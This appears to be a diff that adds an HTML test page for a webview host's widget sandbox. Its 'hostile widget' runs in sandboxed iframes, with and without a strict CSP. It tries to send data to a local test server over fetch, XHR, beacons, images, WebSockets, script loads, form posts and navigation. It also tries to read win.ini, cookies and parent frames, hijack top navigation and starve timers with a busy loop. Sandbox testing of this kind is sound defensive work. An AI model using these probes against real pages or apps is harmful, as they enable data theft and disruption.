@@ -1,0 +1,111 @@
+<!doctype html>
+<html><head><meta charset="utf-8">__HOSTCSP__</head>
+<body style="font:12px sans-serif"><div id="log">running hostile widgets...</div>
+<script>
+const P = __PORT__;
+const log = (m) => { document.getElementById('log').innerText += '\n' + m; };
+const send = (obj) => window.ipc.postMessage(JSON.stringify(obj));
+
+// ---- The hostile widget. Runs INSIDE the sandboxed iframe. Serialized via toString(). ----
+function hostileWidget(cfg) {
+  const R = {};
+  const rec = (k, v) => { R[k] = v; };
+  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+  const attempt = async (k, f) => {
+    try { rec(k, 'OK: ' + String(await f()).slice(0, 60)); }
+    catch (e) { rec(k, 'BLOCKED: ' + ((e && e.name) || 'err') + ' ' + String((e && e.message) || '').slice(0, 60)); }
+  };
+  (async () => {
+    const base = 'http://127.0.0.1:' + cfg.port;
+    if (cfg.mode === 'selfnav') {
+      parent.postMessage({ id: cfg.id, R: { note: 'navigating self to exfil URL' } }, '*');
+      location.href = base + '/selfnav?data=stolen&v=' + cfg.id;
+      return;
+    }
+    if (cfg.mode === 'hb') {
+      let max = 0, last = performance.now();
+      const h = setInterval(() => { const n = performance.now(); max = Math.max(max, n - last); last = n; }, 50);
+      setTimeout(() => { clearInterval(h); parent.postMessage({ id: cfg.id, R: { widget_timer_max_gap_ms: Math.round(max), expected_ms: 50 } }, '*'); }, 4500);
+      return;
+    }
+    if (cfg.mode === 'starve') {
+      parent.postMessage({ id: cfg.id, R: { note: 'busy loop 3s started' } }, '*');
+      const t = Date.now(); while (Date.now() - t < 3000) {}
+      return;
+    }
+    // --- environment / bridge exposure ---
+    rec('origin', location.origin);
+    rec('has_window.ipc', typeof window.ipc);
+    rec('has_chrome.webview', typeof (window.chrome && window.chrome.webview));
+    if (window.ipc) { try { window.ipc.postMessage(JSON.stringify({ direct_from_widget: cfg.id })); rec('ipc_direct_send', 'SENT (host sees it)'); } catch (e) { rec('ipc_direct_send', 'BLOCKED'); } }
+    // --- network exfil channels ---
+    await attempt('fetch', () => fetch(base + '/fetch?v=' + cfg.id).then((r) => r.text()));
+    await attempt('xhr', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', base + '/xhr?v=' + cfg.id); x.onload = () => res(x.status); x.onerror = () => rej(new Error('xhr error')); x.send(); }));
+    await attempt('sendBeacon', () => navigator.sendBeacon(base + '/beacon?v=' + cfg.id, 'x'));
+    await attempt('image', () => new Promise((res, rej) => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => rej(new Error('img error (request may still have been sent)')); i.src = base + '/img?v=' + cfg.id; setTimeout(() => rej(new Error('timeout')), 1200); }));
+    await attempt('websocket', () => new Promise((res, rej) => { const w = new WebSocket('ws://127.0.0.1:' + cfg.port + '/ws?v=' + cfg.id); w.onopen = () => res('open'); w.onerror = () => rej(new Error('ws error')); setTimeout(() => rej(new Error('timeout')), 1200); }));
+    await attempt('import_remote_script', () => import(base + '/x.js?v=' + cfg.id));
+    await attempt('script_tag', () => new Promise((res, rej) => { const s = document.createElement('script'); s.src = base + '/x.js?v=' + cfg.id; s.onload = () => res('loaded'); s.onerror = () => rej(new Error('script error')); document.head.appendChild(s); setTimeout(() => rej(new Error('timeout')), 1200); }));
+    await attempt('form_submit', () => { const f = document.createElement('form'); f.action = base + '/form?v=' + cfg.id; f.method = 'POST'; f.target = '_self'; document.body.appendChild(f); f.submit(); return 'submitted (check server)'; });
+    // --- local files ---
+    await attempt('file_fetch', () => fetch('file:///C:/Windows/win.ini').then((r) => r.text()));
+    // --- storage and cross-widget / host access ---
+    await attempt('localStorage', () => localStorage.getItem('k'));
+    await attempt('cookie', () => document.cookie);
+    await attempt('indexedDB', () => new Promise((res, rej) => { const q = indexedDB.open('x'); q.onsuccess = () => res('opened'); q.onerror = () => rej(new Error('idb error')); setTimeout(() => rej(new Error('timeout')), 800); }));
+    await attempt('parent.document', () => parent.document.title);
+    await attempt('parent.localStorage', () => parent.localStorage.getItem('k'));
+    await attempt('top.location.read', () => top.location.href);
+    await attempt('window.open', () => { const w = window.open(base + '/popup?v=' + cfg.id); return w ? 'opened' : 'null (blocked)'; });
+    // --- postMessage to host is the intended channel; host must treat it as untrusted ---
+    parent.postMessage({ id: cfg.id, R }, '*');
+    await sleep(100);
+    await attempt('top.location.assign', () => { top.location.href = base + '/topnav?v=' + cfg.id; return 'assigned'; });
+    parent.postMessage({ id: cfg.id + ':late', R: { 'top.location.assign': R['top.location.assign'] } }, '*');
+  })();
+}
+
+function makeFrame(id, mode, sandbox, cspMeta) {
+  const cfg = { id, mode, port: P };
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', sandbox);
+  f.style.cssText = 'width:200px;height:60px;border:1px solid #888';
+  f.srcdoc = '<!doctype html><html><head>' + cspMeta + '</head><body><script>(' + hostileWidget.toString() + ')(' + JSON.stringify(cfg) + ')<\/script></body></html>';
+  document.body.appendChild(f);
+  return f;
+}
+
+const waits = {};
+window.addEventListener('message', (e) => {
+  send({ kind: 'widget-result', origin: e.origin, data: e.data });
+  const w = waits[e.data && e.data.id]; if (w) { w(); delete waits[e.data.id]; }
+});
+const waitFor = (id, ms) => new Promise((res) => { waits[id] = res; setTimeout(res, ms); });
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+(async () => {
+  await sleep(500);
+  // V1: sandbox only
+  let f = makeFrame('V1-sandbox-only', 'attack', 'allow-scripts', '');
+  await waitFor('V1-sandbox-only', 12000); await sleep(1500); f.remove();
+  // V2: sandbox + strict CSP delivered as the first element of the widget document
+  const strict = '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; script-src \'unsafe-inline\'; style-src \'unsafe-inline\'">';
+  f = makeFrame('V2-sandbox+CSP', 'attack', 'allow-scripts', strict);
+  await waitFor('V2-sandbox+CSP', 12000); await sleep(1500); f.remove();
+  // V3: iframe navigates itself to an attacker URL (exfil by navigation); sandbox only
+  f = makeFrame('V3-selfnav', 'selfnav', 'allow-scripts', strict);
+  await waitFor('V3-selfnav', 3000); await sleep(2000); f.remove();
+  // V4: busy loop in one widget; host measures its own timer starvation (shared renderer process?)
+  let maxGap = 0, last = performance.now();
+  const hb = setInterval(() => { const n = performance.now(); maxGap = Math.max(maxGap, n - last); last = n; }, 50);
+  f = makeFrame('V4-starve', 'starve', 'allow-scripts', strict);
+  await sleep(4500); clearInterval(hb); f.remove();
+  send({ kind: 'starvation', host_timer_max_gap_ms: Math.round(maxGap), expected_gap_ms: 50, busy_loop_ms: 3000 });
+  // V5: does a busy widget starve ANOTHER widget? (two sandboxed iframes side by side)
+  const victim = makeFrame('V5-victim-heartbeat', 'hb', 'allow-scripts', strict);
+  await sleep(300);
+  const hog = makeFrame('V5-hog', 'starve', 'allow-scripts', strict);
+  await waitFor('V5-victim-heartbeat', 8000); await sleep(500); victim.remove(); hog.remove();
+  send({ kind: 'ALLDONE' });
+})();
+</script></body></html>
